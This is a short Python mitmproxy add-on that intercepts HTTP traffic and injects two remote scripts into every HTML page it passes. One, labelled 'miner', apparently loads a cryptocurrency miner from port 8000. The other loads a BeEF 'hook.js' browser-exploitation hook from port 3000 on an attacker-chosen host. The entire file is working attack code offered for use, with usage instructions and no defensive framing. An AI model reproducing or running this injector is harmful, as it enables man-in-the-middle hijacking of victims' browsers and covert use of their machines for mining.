# Usage: mitmdump -s "js_injector.py src"
# (this script works best with --anticache)
from bs4 import BeautifulSoup
from mitmproxy import ctx, http
import argparse

class Injector:
    def __init__(self, path):
        self.path = path

    def response(self, flow: http.HTTPFlow) -> None:
        if self.path:
            html = BeautifulSoup(flow.response.content, "html.parser")
            print(self.path)
            if not 'Content-Type' in flow.response.headers:
                print("\nNo content type in headers. Get over it.")
            elif flow.response.headers["content-type"] == 'text/html':
                print(flow.response.headers["content-type"])
                miner = html.new_tag(
                    "script",
                    src="http://"+self.path+":8000/script.js",
                    type='application/javascript')
                beef = html.new_tag(
                    "script",
                    src="http://"+self.path+":3000/hook.js",
                    type='application/javascript')
                html.insert(0, miner)
                html.insert(0, beef)
                flow.response.content = str(html).encode("utf8")
                print("Scripts injected.")
            else:
                print("\nWrong content type. Sorry.")
                print(str(flow.response.headers['Content-Type']) + "\n\n")

def start():
    parser = argparse.ArgumentParser()
    parser.add_argument("path", type=str)
    args = parser.parse_args()
    return Injector(args.path)
